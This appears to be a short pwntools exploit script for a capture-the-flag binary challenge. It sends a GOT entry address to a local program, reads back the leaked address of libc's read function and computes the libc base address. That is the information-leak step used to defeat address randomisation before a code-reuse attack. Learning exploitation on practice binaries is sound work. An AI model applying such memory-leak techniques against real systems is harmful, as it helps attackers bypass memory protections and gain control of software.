#!/usr/bin/env python

from pwn import *

endpoint = process("./ar8b_ac")

# ./ar8b_ac constants/offsets
read_got = 0x601030

# libc offsets
read_offset = 0xf7250

endpoint.send(p64(read_got))

data_received = endpoint.recv(8)
read_addr = u64(data_received)

print("[+] Read address: 0x{:2x}".format(read_addr))
libc_base = read_addr - read_offset
print("[+] Libc base: 0x{:2x}".format(libc_base))
